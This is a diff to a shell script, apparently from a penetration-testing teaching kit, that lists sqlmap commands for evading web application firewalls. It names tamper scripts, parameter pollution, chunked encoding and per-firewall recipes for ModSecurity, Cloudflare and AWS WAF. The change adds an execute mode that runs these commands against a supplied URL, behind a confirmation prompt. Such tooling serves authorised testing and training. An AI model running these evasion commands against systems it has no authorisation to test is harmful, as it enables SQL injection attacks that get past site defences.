@@ -3,7 +3,7 @@
 source "$(dirname "$0")/../common.sh"
 
 show_help() {
-    echo "Usage: $(basename "$0") [target-url] [-h|--help]"
+    echo "Usage: $(basename "$0") [target-url] [-h|--help] [-x|--execute]"
     echo ""
     echo "Description:"
     echo "  Demonstrates WAF/IDS evasion techniques using sqlmap tamper scripts."
@@ -13,15 +13,18 @@ show_help() {
     echo "Examples:"
     echo "  $(basename "$0")                                                    # Show bypass techniques"
     echo "  $(basename "$0") 'http://target/page.php?id=1'                      # Target a URL"
+    echo "  $(basename "$0") -x 'http://target/page.php?id=1'                   # Execute against target"
     echo "  $(basename "$0") --help                                             # Show this help message"
 }
 
-[[ "${1:-}" =~ ^(-h|--help)$ ]] && show_help && exit 0
+parse_common_args "$@"
+set -- "${REMAINING_ARGS[@]+${REMAINING_ARGS[@]}}"
 
 require_cmd sqlmap "brew install sqlmap"
 
 TARGET="${1:-}"
 
+confirm_execute "${1:-}"
 safety_banner
 
 info "=== WAF/IDS Bypass Techniques ==="
@@ -52,49 +55,40 @@ echo ""
 URL="${TARGET:-'http://target/page.php?id=1'}"
 
 # 1. Space-to-comment bypass
-info "1) Space-to-comment bypass — replaces spaces with /**/"
-echo "   sqlmap -u ${URL} --batch --tamper=space2comment"
-echo ""
+run_or_show "1) Space-to-comment bypass — replaces spaces with /**/" \
+    sqlmap -u "$URL" --batch --tamper=space2comment
 
 # 2. Between-function bypass
-info "2) Between bypass — replaces > with NOT BETWEEN 0 AND"
-echo "   sqlmap -u ${URL} --batch --tamper=between"
-echo ""
+run_or_show "2) Between bypass — replaces > with NOT BETWEEN 0 AND" \
+    sqlmap -u "$URL" --batch --tamper=between
 
 # 3. Character encoding bypass
-info "3) Character encoding bypass — URL-encodes all characters"
-echo "   sqlmap -u ${URL} --batch --tamper=charencode"
-echo ""
+run_or_show "3) Character encoding bypass — URL-encodes all characters" \
+    sqlmap -u "$URL" --batch --tamper=charencode
 
 # 4. Random case bypass
-info "4) Random case bypass — randomizes keyword capitalization"
-echo "   sqlmap -u ${URL} --batch --tamper=randomcase"
-echo ""
+run_or_show "4) Random case bypass — randomizes keyword capitalization" \
+    sqlmap -u "$URL" --batch --tamper=randomcase
 
 # 5. Combine multiple tamper scripts
-info "5) Combine multiple tamper scripts for stronger evasion"
-echo "   sqlmap -u ${URL} --batch --tamper=space2comment,between,randomcase"
-echo ""
+run_or_show "5) Combine multiple tamper scripts for stronger evasion" \
+    sqlmap -u "$URL" --batch --tamper=space2comment,between,randomcase
 
 # 6. Random user agent + delay
-info "6) Random user agent + delay between requests"
-echo "   sqlmap -u ${URL} --batch --random-agent --delay=2"
-echo ""
+run_or_show "6) Random user agent + delay between requests" \
+    sqlmap -u "$URL" --batch --random-agent --delay=2
 
 # 7. HTTP parameter pollution
-info "7) HTTP parameter pollution"
-echo "   sqlmap -u ${URL} --batch --hpp"
-echo ""
+run_or_show "7) HTTP parameter pollution" \
+    sqlmap -u "$URL" --batch --hpp
 
 # 8. Chunked transfer encoding
-info "8) Chunked transfer encoding — splits payload across chunks"
-echo "   sqlmap -u ${URL} --batch --chunked"
-echo ""
+run_or_show "8) Chunked transfer encoding — splits payload across chunks" \
+    sqlmap -u "$URL" --batch --chunked
 
 # 9. Use a proxy for manual verification
-info "9) Route through a proxy for manual payload inspection"
-echo "   sqlmap -u ${URL} --batch --proxy=http://127.0.0.1:8080 --tamper=space2comment"
-echo ""
+run_or_show "9) Route through a proxy for manual payload inspection" \
+    sqlmap -u "$URL" --batch --proxy=http://127.0.0.1:8080 --tamper=space2comment
 
 # 10. List all available tamper scripts
 info "10) List all available tamper scripts"
@@ -102,26 +96,28 @@ echo "    sqlmap --list-tampers"
 echo ""
 
 # Interactive demo (skip if non-interactive)
-[[ ! -t 0 ]] && exit 0
+if [[ "${EXECUTE_MODE:-show}" == "show" ]]; then
+    [[ ! -t 0 ]] && exit 0
 
-echo ""
-info "Tamper scripts by WAF type:"
-echo ""
-echo "   ModSecurity / OWASP CRS:"
-echo "   --tamper=space2comment,between,randomcase,charencode"
-echo ""
-echo "   Cloudflare:"
-echo "   --tamper=between,randomcase,space2comment --random-agent"
-echo ""
-echo "   AWS WAF:"
-echo "   --tamper=charencode,space2comment --chunked --random-agent"
-echo ""
-echo "   Generic / Unknown WAF:"
-echo "   --tamper=space2comment,between,randomcase,charencode --random-agent --delay=1"
-echo ""
-echo "   Tips:"
-echo "   - Start with a single tamper and add more if blocked"
-echo "   - Use --proxy=http://127.0.0.1:8080 with Burp Suite to inspect payloads"
-echo "   - Combine tamper scripts with --delay and --random-agent"
-echo "   - Run sqlmap --list-tampers for the full list with descriptions"
-echo ""
+    echo ""
+    info "Tamper scripts by WAF type:"
+    echo ""
+    echo "   ModSecurity / OWASP CRS:"
+    echo "   --tamper=space2comment,between,randomcase,charencode"
+    echo ""
+    echo "   Cloudflare:"
+    echo "   --tamper=between,randomcase,space2comment --random-agent"
+    echo ""
+    echo "   AWS WAF:"
+    echo "   --tamper=charencode,space2comment --chunked --random-agent"
+    echo ""
+    echo "   Generic / Unknown WAF:"
+    echo "   --tamper=space2comment,between,randomcase,charencode --random-agent --delay=1"
+    echo ""
+    echo "   Tips:"
+    echo "   - Start with a single tamper and add more if blocked"
+    echo "   - Use --proxy=http://127.0.0.1:8080 with Burp Suite to inspect payloads"
+    echo "   - Combine tamper scripts with --delay and --random-agent"
+    echo "   - Run sqlmap --list-tampers for the full list with descriptions"
+    echo ""
+fi
